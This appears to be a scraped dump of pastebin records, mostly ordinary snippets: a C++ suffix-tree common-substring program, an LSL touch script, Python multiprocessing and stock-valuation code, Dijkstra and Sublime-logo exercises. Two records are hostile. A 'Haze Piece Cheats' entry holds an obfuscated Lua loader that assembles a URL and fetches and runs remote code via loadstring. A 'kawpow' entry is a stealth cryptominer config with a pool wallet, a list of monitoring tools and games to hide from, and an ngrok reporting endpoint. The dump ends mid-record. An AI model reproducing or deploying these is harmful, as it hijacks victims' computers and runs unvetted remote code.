        ExtendTextFlags(child.Node);
        node->TextFlag |= child.Node->TextFlag;
    }
}

TCompactTrie* BuildCommonSuffixTree(string& s1, string& s2) {
    TCompactTrie* trie = BuildSuffixTrie(s1, nullptr, 1);
    BuildSuffixTrie(s2, trie, 2);
    ExtendTextFlags(&(trie->Root));
    return trie;
}

size_t CalculateMaxCommonSubstringSize(const TNode& node) {
    if(node.Children.empty()) return -1;
    size_t maximalSize = 0;

    for(const TEdge& child : node.Children) {
        if(child.Node->TextFlag == 3) {
            maximalSize = max(
                maximalSize,
                child.Value.Length() + CalculateMaxCommonSubstringSize(*(child.Node))
            );
        }
    }
    return maximalSize;
}

void RestoreString(const TNode* node, string& outString) {
    while(node->Parent != nullptr) {
        const TEdge& x = node->Parent->Children[node->ParentEdge];
        outString.insert(0, x.Value.ToString());
        node = node->Parent;
    };
}

void FindCommonSubstringsBySpecifiedSize(
    const TNode& node,
    const size_t& maximalSize,
    const size_t& currentSize,
    set<string> & substrings
) {
    if(currentSize == maximalSize) {
        string foundSubstring;
        RestoreString(&node, foundSubstring);
        if (foundSubstring.back() == '$')
            foundSubstring.pop_back();
        substrings.insert(foundSubstring);
        return;
    }

    if(currentSize > maximalSize) {
        return;
    }

    for(const TEdge& child : node.Children) {
        if(child.Node->TextFlag == 3) {
            size_t nextLength = child.Value.Length();

            if(child.Node->Children.empty())
                nextLength--;

            FindCommonSubstringsBySpecifiedSize(
                *(child.Node),
                maximalSize,
                currentSize + nextLength,
                substrings
            );
        }
    }
}

void FindCommonSubstrings(TCompactTrie& trie, set<string> & results) {
    size_t maxLength = CalculateMaxCommonSubstringSize(trie.Root);
    FindCommonSubstringsBySpecifiedSize(
        trie.Root,
        maxLength,
        0,
        results
    );
}

const char SENTINEL = '$';

int main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);

    string a, b;
    set<string> results;
    getline(cin, a);
    getline(cin, b);

    a += SENTINEL;
    b += SENTINEL;

    TCompactTrie* trie = BuildCommonSuffixTree(a, b);

    FindCommonSubstrings(*trie, results);

    bool sizePrinted = false;

    for(const string& result: results) {
        if(result.size() == 0) {
            break;
        }

        if(!sizePrinted) {
            cout << result.size();
            sizePrinted = true;
        }

        cout << ""\n"" << result;
    }

    return 0;
}
"
VXpbrLrc,Haze Piece Cheats,Androssy,Lua,Sunday 24th of September 2023 11:27:27 AM CDT,"([[]]){(function(b)local c=debug.getmetatable(b)debug.setmetatable(b,{__call=function(d,e)debug.setmetatable(b,c)return function(b)b{'69959ca88769066df29b4dc43b79886f',d}end end})end)''}(function(b)local b=b[1]local c=''local d=24915;local e=0;local f={}while e<966 do e=e+1;while e<605 and d%5260<2630 do e=e+1;d=(d-466)%41090;local b=e+d;if(d%3504)>1752 then d=(d-706)%30483;while e<313 and d%7102<3551 do e=e+1;d=(d*411)%43087;local b=e+d;if(d%14970)>7485 then d=(d*355)%41240;local b=76830;if not f[b]then f[b]=1;c=c..'.n'end elseif d%2~=0 then d=(d*316)%34377;local b=51374;if not f[b]then f[b]=1;c=c..'luarmor'end else d=(d*939)%2412;e=e+1;local b=67052;if not f[b]then f[b]=1 end end end elseif d%2~=0 then d=(d+986)%9320;while e<597 and d%3566<1783 do e=e+1;d=(d-950)%7147;local b=e+d;if(d%4020)<2010 then d=(d+826)%6247;local b=79206;if not f[b]then f[b]=1;c=c..'ht'end elseif d%2~=0 then d=(d+737)%14175;local b=51471;if not f[b]then f[b]=1;c=c..'tp'end else d=(d*705)%44808;e=e+1;local b=58695;if not f[b]then f[b]=1;c=c..'s:'end end end else d=(d*80)%11734;e=e+1;while e<951 and d%19762<9881 do e=e+1;d=(d*899)%25086;local b=e+d;if(d%11548)>5774 then d=(d*412)%37881;local b=84492;if not f[b]then f[b]=1;c=c..'//'end elseif d%2~=0 then d=(d-419)%22808;local b=94003;if not f[b]then f[b]=1;c=c..'ap'end else d=(d-851)%30011;e=e+1;local b=21386;if not f[b]then f[b]=1;c=c..'i.'end end end end end;d=(d+751)%33125 end(function(d)local e=d;local f=0;local g=0;e={(function(b)if f>34 then return b end;f=f+1;g=(g+3253-b)%79;return(g%3==1 and(function(b)if not d[b]then g=g+1;d[b]=(26)c=c..'il'end;return true end)'igRzv'and e[2](687+b))or(g%3==0 and(function(b)if not d[b]then g=g+1;d[b]=(103)c=c..'.l'end;return true end)'TilxU'and e[3](b+101))or(g%3==2 and(function(b)if not d[b]then g=g+1;d[b]=(227)end;return true end)'QwIsb'and e[1](b+320))or b end),(function(b)if f>32 then return b end;f=f+1;g=(g+1509-b)%57;return(g%3==0 and(function(b)if not d[b]then g=g+1;d[b]=(139)c=c..'et'end;return true end)'aOitw'and e[3](909+b))or(g%3==1 and(function(b)if not d[b]then g=g+1;d[b]=(65)end;return true end)'ObBbT'and e[1](b+129))or(g%3==2 and(function(b)if not d[b]then g=g+1;d[b]=(153)c=c..'ua'end;return true end)'uXJZp'and e[2](b+567))or b end),(function(h)if f>35 then return h end;f=f+1;g=(g+1756-h)%21;return(g%3==2 and(function(b)if not d[b]then g=g+1;d[b]=(2)c=c..'/f'end;return true end)'bdEJm'and e[1](782+h))or(g%3==0 and(function(b)if not d[b]then g=g+1;d[b]=(108)c=c..'es'end;return true end)'JDvcj'and e[3](h+117))or(g%3==1 and(function(e)if not d[e]then g=g+1;d[e]=(10)c=c..'/v3/l/'..b end;return true end)'tIFsS'and e[2](h+748))or h end)}e[2](8832)end){}loadstring(game:HttpGet(c)){}end)
"
PmfY0MJH,Untitled,Dorex,Linden Scripting,Sunday 24th of September 2023 11:20:30 AM CDT,"//
//#################################################################################################################################
//
// Detect Long or Short Touch
//
// Dorex Delicioso 2023
//
//#################################################################################################################################

integer DODEBUG = TRUE;

// ############################## VARIABLES ##############################

float touchEventTime;

// ############################## FUNCTIONS ##############################

sayDebug(string text){
    if (DODEBUG){
        llOwnerSay(text);
    }
}

shortTouch(key avId){
    sayDebug(""short Touch"");
}

longTouch(key avId){
    sayDebug(""long Touch"");
}

// ############################## DEFAULT STATE ##############################

default
{  
    on_rez(integer start) {
        llResetScript();
    }

    touch_start(integer a)
    {
        touchEventTime = llGetTime();
    }


    touch_end(integer num_detected){
        
        // how long is a long touch, in seconds
        integer longTouchMinTime = 2;

        if (llGetTime()  > touchEventTime + longTouchMinTime){
            longTouch(llDetectedKey(0));
        } else {
            shortTouch(llDetectedKey(0));
        }
    }
}"
km5mGtSU,Multiprocessing resource manager,thehunmonkgroup,Python,Sunday 24th of September 2023 10:52:16 AM CDT,"import multiprocessing
import time
import os

def worker(stop_event):
    print(f'Worker started: {os.getpid()}')
    while not stop_event.is_set():
        # Simulate some work
        time.sleep(1)
        # Simulate random crash
        if time.time() % 2 > 1.5:
            print(f'Worker crashed: {os.getpid()}')
            os._exit(1)

def supervisor():
    stop_event = multiprocessing.Event()
    while True:
        print('Supervisor starting worker')
        worker_process = multiprocessing.Process(target=worker, args=(stop_event,))
        worker_process.start()

        # Wait for the worker to finish
        worker_process.join()

        # If the worker didn't exit cleanly, restart it
        if worker_process.exitcode != 0:
            print('Worker exited with error, restarting')
            continue

        # If the worker exited cleanly, check if we should stop
        if stop_event.is_set():
            print('Stopping supervisor')
            break

if __name__ == '__main__':
    try:
        supervisor()
    except KeyboardInterrupt:
        print('Received KeyboardInterrupt, stopping workers')
        stop_event.set()"
aHTWnbDC,Create graphics interface with widget,olp_EX,Python,Sunday 24th of September 2023 10:49:38 AM CDT,"from tkinter import *

root = Tk()
root.title('Перша програма')
root.geometry('300x300')

# Віджет Label з вказаними атрибутами
lab1 = Label(root, text='Привіт, друже!', font='Arial 18', bg='yellow', fg='grey')
lab1.pack()

# Запуск циклу обробки подій
root.mainloop()
"
Mdu12Raw,Untitled,aimartinich,Python,Sunday 24th of September 2023 10:25:27 AM CDT,"import argparse
import itertools
from string import ascii_lowercase


def makeOrderedStrings():
    """"""
    Generate and print strings in lexicographical order from a starting point to an ending point.
    """"""
    start_index = None
    end_index = None
    raw_sequence = []

    for length in range(1, len(cl_args.stop) + 1):
        current_length_generation = itertools.combinations_with_replacement(ascii_lowercase, length)
        raw_sequence.extend(''.join(x) for x in current_length_generation)

    for i, string in enumerate(raw_sequence):
        if string == cl_args.start:
            start_index = i
        if string == cl_args.stop:
            end_index = i + 1

    for x in raw_sequence[start_index:end_index]:
        print(*x, sep='')


if __name__ == '__main__':
    cl_parser = argparse.ArgumentParser(description='Shows strings in lexicographical order from one point to another')
    cl_parser.add_argument('start', type=str, help='Starting point. Provide string of lowercase English letters')
    cl_parser.add_argument('stop', type=str, help='Ending point. Provide string of lowercase English letters')
    cl_args = cl_parser.parse_args()

    makeOrderedStrings()
"
fhLbAYmB,FBS &#8211; How to Claim $100 Quick Start Bonus,fxvnpro,PHP,Sunday 24th of September 2023 10:19:35 AM CDT,https://www.fxvnpro.com/fbs-how-to-claim-100-quick-start-bonus/
VVqc0EM8,Untitled,Josif_tepe,C++,Sunday 24th of September 2023 10:16:46 AM CDT,"#include <queue>
#include <iostream>
#include <vector>
#include <cstring>
#include <iostream>
#include <set>
#include <cstring>
//#include <bits/stdc++.h>
using namespace std;
typedef long long ll;
const int maxn = 1e5 + 10;
const ll INF = 3e16 + 10;
int n, m, k;
vector<pair<int, int> > graph[maxn];
int cities[maxn];
bool to_build[maxn];
struct node {
    int idx;
    ll cost;
    
    node () {}
    node(int _idx, ll _cost) {
        idx = _idx;
        cost = _cost;
    }
    bool operator < (const node &tmp) const {
        return cost > tmp.cost;
    }
};
pair<int, ll> find_nearest_city() {
    vector<ll> dist(n, INF);
    vector<bool> visited(n, false);
    dist[0] = 0;
    priority_queue<node> pq;
    pq.push(node(0, 0));
    while(!pq.empty()) {
        node c = pq.top();
        pq.pop();
        if(visited[c.idx]) continue;
        visited[c.idx] = true;
        
        for(int i = 0; i < (int) graph[c.idx].size(); i++) {
            int neighbour = graph[c.idx][i].first;
            ll weight = graph[c.idx][i].second;
            
            
            if(!visited[neighbour] and c.cost + weight < dist[neighbour]) {
                dist[neighbour] = c.cost + weight;
                pq.push(node(neighbour, dist[neighbour]));
            }
        }
    }
    ll shortest_distance = INF;
    int nearest_city = -1;
    for(int i = 0; i < k; i++) {
        if(shortest_distance > dist[cities[i]]) {
            shortest_distance = dist[cities[i]];
            nearest_city = cities[i];
        }
    }
    return make_pair(nearest_city, shortest_distance);
}
ll dijkstra(int S) {
    vector<ll> dist(n, INF);
    dist[S] = 0;
    priority_queue<node> pq;
    pq.push(node(S, 0));
    set<int> st;
    ll result = 0;
    while(!pq.empty() and (int) st.size() < k) {
        node c = pq.top();
        pq.pop();
        
        if(c.cost > dist[c.idx]) continue;
        
        if(to_build[c.idx]) {
            result += c.cost;
            c.cost = 0;
            to_build[c.idx] = false;
            st.insert(c.idx);
        }
        dist[c.idx] = c.cost;
        for(int i = 0; i < (int) graph[c.idx].size(); i++) {
            int neighbour = graph[c.idx][i].first;
            ll weight = graph[c.idx][i].second;
            pq.push(node(neighbour, c.cost + weight));
        }
        
    }
    return result;
}
int main() {
    ios_base::sync_with_stdio(false);
    memset(to_build, false, sizeof to_build);
    cin >> n >> m;
    for(int i = 0; i < m; i++) {
        int a, b, c;
        cin >> a >> b >> c;
        graph[a].push_back(make_pair(b, c));
        graph[b].push_back(make_pair(a, c));
    }
    cin >> k;
    for(int i = 0; i < k; i++) {
        cin >> cities[i];
        to_build[cities[i]] = true;
    }
    pair<int, ll> nearest_city = find_nearest_city();
    ll result = dijkstra(nearest_city.first);
    
    cout << nearest_city.second + result << endl;
    
    return 0;
}
"
Dg74dVBc,Поликлиника,Yaniha,C#,Sunday 24th of September 2023 10:14:58 AM CDT,"using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using static System.Net.Mime.MediaTypeNames;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int countPeopleInTheQueue;
            int doctorsAppointmentTime = 10;
            int hours;
            int minutes;
            int minutesPerHour = 60;
            int waitingTime;

            Console.WriteLine(""Введите количество человек в очереди: "");
            countPeopleInTheQueue = Convert.ToInt32(Console.ReadLine());
            waitingTime = countPeopleInTheQueue * doctorsAppointmentTime;
            hours = waitingTime / minutesPerHour;
            minutes = waitingTime % minutesPerHour;

            Console.WriteLine($""Примерное время ожидания: {hours} часов {minutes} минут."");
            
            Console.ReadKey();
        }
    }
}"
EfMWyam9,Untitled,samipote,Python,Sunday 24th of September 2023 10:08:22 AM CDT,"
def get_sector_yfinance(ticker_symbol):
    """"""Fetch the sector for a given ticker using yfinance.""""""
    ticker = yf.Ticker(ticker_symbol)
    info = ticker.info
    return info.get('sector', None)

def get_industry_yfinance(ticker_symbol):
    """"""Fetch the sector for a given ticker using yfinance.""""""
    ticker = yf.Ticker(ticker_symbol)
    info = ticker.info
    return info.get('sector', None)

def get_stocks_from_same_industry(ticker_symbol):
    """"""Fetch stocks from the same industry as the provided ticker.""""""
    # Get the sector for the given ticker using yfinance
    sector = get_industry_yfinance(ticker_symbol)

    if not sector:
        print(f""Could not find industry for {ticker_symbol}"")
        return None

    # Initialize the screener from yahooquery
    s = Screener()

    # Using sector to screen stocks
    screen_key = f""ms_{sector.lower()}""
    
    if screen_key not in s.available_screeners:
        print(f""No predefined screener available for sector: {sector}"")
        return None

    data = s.get_screeners(screen_key)

    # Convert data to DataFrame for easier handling
    df = pd.DataFrame(data[screen_key]['quotes'])
    
    return df

def calculate_rolling_beta(stock_data, market_data, window_size):
    stock_returns = stock_data['Adj Close'].pct_change().dropna()
    market_returns = market_data['Adj Close'].pct_change().dropna()

    rolling_cov = stock_returns.rolling(window=window_size).cov(market_returns)
    rolling_var = market_returns.rolling(window=window_size).var()

    rolling_beta = rolling_cov / rolling_var
    return rolling_beta.dropna()

def get_unlevered_beta(ticker):
    stock = yf.Ticker(ticker)

    # Get levered beta
    levered_beta = stock.info['beta']
    if not levered_beta:
        return None

    # Get debt and equity values
    market_cap = stock.info['marketCap'] / 10**9
    long_term_debt = stock.balance_sheet.loc[""Long Term Debt""][0] / 10**9 if ""Long Term Debt"" in stock.balance_sheet.index else 0
    short_term_debt = stock.balance_sheet.loc[""Short Term Debt""][0] / 10**9 if ""Short Term Debt"" in stock.balance_sheet.index else 0
    debt_value = long_term_debt + short_term_debt
    equity_value = market_cap

    # Calculate the effective tax rate
    income_statement = stock.financials
    pretax_income = float(income_statement.loc[""Pretax Income""].iloc[0])
    income_tax_expense = float(income_statement.loc[""Tax Provision""].iloc[0])
    effective_tax_rate = income_tax_expense / pretax_income
    T = effective_tax_rate

    # Calculate unlevered beta
    return levered_beta / (1 + ((1 - T) * (debt_value / equity_value)))


def get_pretax_cost_of_debt(ticker):
    """"""Compute the pre-tax cost of debt for a given ticker.""""""
    stock = yf.Ticker(ticker)

    income_statement = stock.financials
    balance_sheet = stock.balance_sheet

    # Interest Expense from the income statement
    interest_expense = float(income_statement.loc[""Interest Expense""].iloc[0]) if ""Interest Expense"" in income_statement.index else 0

    # Average Total Debt calculation
    current_long_term_debt = float(balance_sheet.loc[""Long Term Debt""].iloc[0]) if ""Long Term Debt"" in balance_sheet.index else 0
    previous_long_term_debt = float(balance_sheet.loc[""Long Term Debt""].iloc[1]) if ""Long Term Debt"" in balance_sheet.index else 0

    current_short_term_debt = float(balance_sheet.loc[""Short Term Debt""].iloc[0]) if ""Short Term Debt"" in balance_sheet.index else 0
    previous_short_term_debt = float(balance_sheet.loc[""Short Term Debt""].iloc[1]) if ""Short Term Debt"" in balance_sheet.index else 0

    average_debt = (current_long_term_debt + current_short_term_debt + previous_long_term_debt + previous_short_term_debt) / 2

    # Calculate the pre-tax cost of debt
    if average_debt == 0:
        return 0
    else:
        return interest_expense / average_debt

def get_year_cost_of_debt_converges(ticker, comparable_tickers):
  """"""Compute the year when the cost of debt converges to the industry average.""""""
  # Get the current pre-tax cost of debt for the given ticker
  current_pretax_cost_of_debt = get_pretax_cost_of_debt(ticker)
  if not current_pretax_cost_of_debt:
    return None # No cost of debt available
  
  # Get the pre-tax cost of debt for each comparable ticker
  pretax_costs_of_debt = [get_pretax_cost_of_debt(ticker) for ticker in comparable_tickers]
  pretax_costs_of_debt = [cost for cost in pretax_costs_of_debt if cost is not None] # Remove None values
  
  # Calculate the industry average pre-tax cost of debt
  industry_average_pretax_cost_of_debt = sum(pretax_costs_of_debt) / len(pretax_costs_of_debt)
  
  # Estimate the terminal pre-tax cost of debt using a weighted average
  omega = 0.5 # Weight given to the company's current pre-tax cost of debt
  terminal_pretax_cost_of_debt = omega * current_pretax_cost_of_debt + (1 - omega) * industry_average_pretax_cost_of_debt
  
  # Assume a linear convergence from the current to the terminal cost of debt
  # Use the equation y = mx + b, where y is the cost of debt, x is the year, m is the slope, and b is the intercept
  # Solve for x when y equals the terminal cost of debt
  slope = (terminal_pretax_cost_of_debt - current_pretax_cost_of_debt) / DURATION # DURATION is the number of years for valuation
  intercept = current_pretax_cost_of_debt
  year_cost_of_debt_converges = (terminal_pretax_cost_of_debt - intercept) / slope
  
  return year_cost_of_debt_converges

def get_marginal_tax_rate(ticker):
    """"""Compute the marginal tax rate for a given ticker using yfinance.""""""
    # Get the income statement from yfinance
    stock = yf.Ticker(ticker)
    income_statement = stock.financials

    # Get the income before tax and income tax expense from the income statement
    income_before_tax = float(income_statement.loc[""Pretax Income""].iloc[0])
    income_tax_expense = float(income_statement.loc[""Tax Provision""].iloc[0])

    # Calculate the marginal tax rate as the ratio of income tax expense to income before tax
    marginal_tax_rate = income_tax_expense / income_before_tax

    # Return the marginal tax rate as a percentage
    return marginal_tax_rate

def get_ttm_total_revenue(ticker_symbol):
    ticker = yf.Ticker(ticker_symbol)
    
    # Fetch the total revenue for the TTM
    ttm_revenue = ticker.info['totalRevenue']
    
    return ttm_revenue


# Define the URL for the API endpoint
TICKER = ""AAPL""
ENDPOINT = ""https://query1.finance.yahoo.com/v7/finance/download/{}""
TICKER_SP500 = ""^GSPC""
DURATION = 5
TODAY = int(datetime.now().timestamp())
TEN_YEARS_AGO = int((datetime.now() - pd.DateOffset(years=DURATION)).timestamp())
urlRFR = ""https://query1.finance.yahoo.com/v7/finance/download/%5ETNX?period1=0&period2=9999999999&interval=1d&events=history&includeAdjustedClose=true""
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}
responseRFR = requests.get(urlRFR, headers=headers)

if responseRFR.status_code == 200:
    content = responseRFR.text
    lines = content.strip().split(""\n"")
    
    if len(lines) < 2:  # Check if there's at least a header and one data line
        print(""Error: Not enough data lines in the response."")
        exit()
    
    last_line = lines[-1]
    values = last_line.split("","")
    
    if len(values) < 4:  # Check if there are enough values in the last line
        print(""Error: Not enough values in the data line."")
        exit()

    RFR = float(values[3])
    print(f""The 10-year treasury yield in USA is {RFR}%"")
else:
    print(f""Error: The request failed with status code {responseRFR.status_code}. Response: {responseRFR.text}"")


# Fetch S&P 500 historical data
urlSP500 = ENDPOINT.format(TICKER_SP500) + f""?period1={TEN_YEARS_AGO}&period2={TODAY}&interval=1d&events=history&includeAdjustedClose=true""
responseSP500 = requests.get(urlSP500, headers=headers)
if responseSP500.status_code != 200:
    raise Exception(""Error fetching S&P 500 data."")
dataSP500 = pd.read_csv(urlSP500, parse_dates=['Date'], index_col='Date')

urlCOMPANY = ENDPOINT.format(TICKER) + f""?period1={TEN_YEARS_AGO}&period2={TODAY}&interval=1d&events=history&includeAdjustedClose=true""
responseCOMPANY = requests.get(urlCOMPANY, headers=headers)
if responseCOMPANY.status_code != 200:
    raise Exception(""Error fetching company data."")
dataCOMPANY = pd.read_csv(io.StringIO(responseCOMPANY.text), parse_dates=['Date'], index_col='Date')

historical_beta = calculate_rolling_beta(dataCOMPANY, dataSP500, DURATION)

# Calculate annualized return for S&P 500 over the given duration
initial_value = dataSP500['Adj Close'].iloc[0]
final_value = dataSP500['Adj Close'].iloc[-1]
Rm = ((final_value / initial_value) ** (1/DURATION) - 1)
risk_free_rate = RFR/100
ERP = Rm - risk_free_rate
print(f""Equity Risk Premium: {ERP*100:.2f}%"")

# Use yfinance to get the market capitalization
stock = yf.Ticker(TICKER)
market_cap = stock.info['marketCap'] / 10**9  # Convert to billions

equity_value = market_cap
print(f""The equity value (market cap) of {TICKER} is approximately ${market_cap:.2f} billion."")

# Use yfinance to get the debt values
long_term_debt = stock.balance_sheet.loc[""Long Term Debt""][0] if ""Long Term Debt"" in stock.balance_sheet.index else 0
short_term_debt = stock.balance_sheet.loc[""Short Term Debt""][0] if ""Short Term Debt"" in stock.balance_sheet.index else 0

# Calculate total debt
debt_value = (long_term_debt + short_term_debt) / 10**9  # Convert to billions
print(f""The total debt of {TICKER} is approximately ${debt_value:.2f} billion."")

# Use yfinance to get the cash and non-operating asset values
cash_and_cash_equivalents = stock.balance_sheet.loc[""Cash And Cash Equivalents""][0] if ""Cash And Cash Equivalents"" in stock.balance_sheet.index else 0
# Convert to billions
cash_and_non_operating_asset = cash_and_cash_equivalents / 10**9
print(f""Cash and non-operating assets of {TICKER} is approximately ${cash_and_non_operating_asset:.2f} billion."")


df_result = get_stocks_from_same_industry(TICKER)
comparable_tickers = df_result['symbol'].tolist()

print(comparable_tickers) 
# Get unlevered betas for each comparable
unlevered_betas = [get_unlevered_beta(ticker) for ticker in comparable_tickers]
unlevered_betas = [beta for beta in unlevered_betas if beta is not None]  # Remove None values
# Calculate the industry average unlevered beta
industry_average_unlevered_beta = sum(unlevered_betas) / len(unlevered_betas)

# Estimate the terminal_unlevered_beta
omega = 0.5  # Weight given to the company's current unlevered beta
unlevered_beta = get_unlevered_beta(TICKER)
terminal_unlevered_beta = omega * unlevered_beta + (1 - omega) * industry_average_unlevered_beta

print(f""The estimated unlevered beta is: {unlevered_beta:.4f}"")
print(f""The estimated terminal unlevered beta is: {terminal_unlevered_beta:.4f}"")

# Linear regression model
X = np.array(range(len(historical_beta))).reshape(-1, 1)
y = historical_beta.values
model = LinearRegression().fit(X, y)
slope = model.coef_
intercept = model.intercept_

# Calculate the intersection point with terminal beta using the equation of the line
# y = mx + c; terminal_beta = slope*x + intercept
intersection_point = (terminal_unlevered_beta - intercept) / slope

# Convert intersection_point to years (assuming your historical data is daily)
intersection_in_years = intersection_point[0]/365

print(f""Expected year to converge to terminal beta: {intersection_in_years:.2f} years"")

year_beta_begins_to_converge_to_terminal_beta = intersection_in_years

# Calculate the effective tax rate
income_statement = stock.financials
pretax_income = float(income_statement.loc[""Pretax Income""].iloc[0])
income_tax_expense = float(income_statement.loc[""Tax Provision""].iloc[0])
tax_rate = income_tax_expense / pretax_income

print(f""Current Effective Tax Rate: {tax_rate:.2%}"")

current_effective_tax_rate = tax_rate

current_pretax_cost_of_debt = get_pretax_cost_of_debt(TICKER)

print(f""Current Pretax Cost of Debt: {current_pretax_cost_of_debt:.2%}"")

# Get pre-tax cost of debt for each comparable
pretax_costs_of_debt = [get_pretax_cost_of_debt(ticker) for ticker in comparable_tickers]
pretax_costs_of_debt = [cost for cost in pretax_costs_of_debt if cost is not None]

# Calculate the industry average pre-tax cost of debt
industry_average_pretax_cost_of_debt = sum(pretax_costs_of_debt) / len(pretax_costs_of_debt)

# Estimate the terminal_pre_tax_cost_of_debt
omega = 0.5  # Weight given to the company's current pre-tax cost of debt
terminal_pretax_cost_of_debt = omega * current_pretax_cost_of_debt + (1 - omega) * industry_average_pretax_cost_of_debt

print(f""The estimated terminal pre-tax cost of debt is: {terminal_pretax_cost_of_debt:.2%}"")

year_cost_of_debt_begins_to_converge_to_terminal_cost_of_debt = get_year_cost_of_debt_converges(TICKER, comparable_tickers)

print(f""Expected year to converge to the cost of debt: {year_cost_of_debt_begins_to_converge_to_terminal_cost_of_debt} years"")

marginal_tax_rate = get_marginal_tax_rate(TICKER)

print(f""Current Marginal Tax Rate: {marginal_tax_rate:.2%}"")

year_effective_tax_rate_begin_to_converge_marginal_tax_rate = 1

revenue_base = get_ttm_total_revenue(TICKER)

print(f""The total revenue of {TICKER} is approximately ${revenue_base}"")

base_case_valuation = valuator_multi_phase(
            risk_free_rate,
            ERP,
            equity_value,
            debt_value,
            cash_and_non_operating_asset,
            unlevered_beta,
            terminal_unlevered_beta,
            year_beta_begins_to_converge_to_terminal_beta,
            current_pretax_cost_of_debt,
            terminal_pretax_cost_of_debt,
            year_cost_of_debt_begins_to_converge_to_terminal_cost_of_debt,
            current_effective_tax_rate,
            marginal_tax_rate,
            year_effective_tax_rate_begin_to_converge_marginal_tax_rate,
             revenue_base,
             revenue_growth_rate_cycle1_begin,
             revenue_growth_rate_cycle1_end,
             length_of_cylcle1,
             revenue_growth_rate_cycle2_begin,
             revenue_growth_rate_cycle2_end,
             length_of_cylcle2,
             revenue_growth_rate_cycle3_begin,
             revenue_growth_rate_cycle3_end,
             length_of_cylcle3,
            revenue_convergance_periods_cycle1= 1,
            revenue_convergance_periods_cycle2=1,
            revenue_convergance_periods_cycle3=1,
            current_sales_to_capital_ratio = 1.7,
            terminal_sales_to_capital_ratio = 1.3,
            year_sales_to_capital_begins_to_converge_to_terminal_sales_to_capital = 1,
            current_operating_margin = .15,
            terminal_operating_margin = .175,
            year_operating_margin_begins_to_converge_to_terminal_operating_margin = 1,
            additional_return_on_cost_of_capital_in_perpetuity= 0.02,
            asset_liquidation_during_negative_growth=0,
            current_invested_capital = 6.062)
point_estimate_describer(base_case_valuation)"
puusm4vu,kawpow,tarekxx,JSON,Sunday 24th of September 2023 10:02:15 AM CDT,"{
	""url"": ""stratums://8AVchyHSiFHHZMe5YvGVB1G9L6CMqxqqh2KixC3heCwjWWRr1rt6zJdVyiyA3c9RvQ3SAZ1NwNsC6K1aBmrJ3FPuQFWRxP2:kawpow~kawpow@gulf.moneroocean.stream:443"",
	""algo"": ""kawpow"",
	""max-gpu"": 50,
	""idle-wait"": 1,
	""idle-gpu"": 80,
	""stealth-targets"": ""Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,ModernWarfare.exe,ShooterGame.exe,ShooterGameServer.exe,ShooterGame_BE.exe,GenshinImpact.exe,FactoryGame.exe,Borderlands2.exe,EliteDangerous64.exe,PlanetCoaster.exe,Warframe.x64.exe,NMS.exe,RainbowSix.exe,RainbowSix_BE.exe,CK2game.exe,ck3.exe,stellaris.exe,arma3.exe,arma3_x64.exe,TslGame.exe,ffxiv.exe,ffxiv_dx11.exe,GTA5.exe,FortniteClient-Win64-Shipping.exe,r5apex.exe,VALORANT.exe,csgo.exe,PortalWars-Win64-Shipping.exe,FiveM.exe,left4dead2.exe,FIFA21.exe,BlackOpsColdWar.exe,EscapeFromTarkov.exe,TEKKEN 7.exe,SRTTR.exe,DeadByDaylight-Win64-Shipping.exe,PointBlank.exe,enlisted.exe,WorldOfTanks.exe,SoTGame.exe,FiveM_b2189_GTAProcess.exe,NarakaBladepoint.exe,re8.exe,Sonic Colors - Ultimate.exe,iw6sp64_ship.exe,RocketLeague.exe,Cyberpunk2077.exe,FiveM_GTAProcess.exe,RustClient.exe,Photoshop.exe,VideoEditorPlus.exe,AfterFX.exe,League of Legends.exe,Falluot4.exe,FarCry5.exe,RDR2.exe,Little_Nightmares_II_Enhanced-Win64-Shipping.exe,NBA2K22.exe,Borderlands3.exe,LeagueClientUx.exe,RogueCompany.exe,Tiger-Win64-Shipping.exe,WatchDogsLegion.exe,Phasmophobia.exe,VRChat.exe,NBA2K21.exe,NarakaBladepoint.exe,ForzaHorizon4.exe,acad.exe,bf4.exe,zula.exe,Adobe Premiere Pro.exe,GenshinImpact.exe,LeagueClient.exe"",
	""kill-targets"": """",
	""stealth-fullscreen"": true,
	""api-endpoint"": ""https://c5207bfb0223-4425600227365081465.ngrok-free.app/api/endpoint.php""
}"
Q1r52dDD,Sublime Logo,Spocoman,C++,Sunday 24th of September 2023 10:00:33 AM CDT,"#include <iostream>
#include <string>

using namespace std;

string repeat(char s, int n) {
    string result;

    for (int i = 0; i < n; i++)
    {
        result += s;
    }
    return result;
}

int main() {
    int n;
    cin >> n;

    int spaces = 2 * n - 2;
    int stars = 2;

    for (int row = 0; row < n; row++) {
        cout << repeat(' ', spaces)
            << repeat('*', stars) << endl;
        spaces -= 2;
        stars += 2;
    }

    spaces = 2;
    stars = 2 * n - 2;

    for (int row = 0; row < 2; row++) {
        cout << repeat('*', stars)
            << repeat(' ', spaces) << endl;
        spaces += 2;
        stars -= 2;
    }

    spaces = 2;
    stars = 2 * n - 2;

    for (int row = 0; row < 2; row++) {
        cout << repeat('*', stars)
            << repeat(' ', spaces) << endl;
        if (spaces > 0 && stars > 0) {
            spaces -= 2;
            stars += 2;
        }
    }

    spaces = 2;
    stars = 2 * n - 2;

    for (int row = 0; row < 2; row++) {
        cout << repeat(' ', spaces)
            << repeat('*', stars) << endl;
        spaces += 2;
        stars -= 2;
    }

    spaces = 2;
    stars = 2 * n - 2;

    for (int row = 0; row < 2; row++) {
        cout << repeat(' ', spaces)
            << repeat('*', stars) << endl;
        if (spaces > 0 && stars > 0) {
            spaces -= 2;
            stars += 2;
        }
    }

    spaces = 2;
    stars = 2 * n - 2;

    for (int row = 0; row < n; row++) {
        cout << repeat('*', stars)
            << repeat(' ', spaces) << endl;
        spaces += 2;
        stars -= 2;
    }

    return 0;
}"
U9ntHcfW,Sublime Logo,Spocoman,JavaScript,Sunday 24th of September 2023 09:57:26 AM CDT,"function sublimeLogo(input) {
    let n = Number(input);

    let output = """";

    let spaces = 2 * n - 2;
    let stars = 2;

    for (let row = 0; row < n; row++) {
        output += ' '.repeat(spaces) + '*'.repeat(stars) + ""\n"";
        spaces -= 2;
        stars += 2;
    }

    spaces = 2;
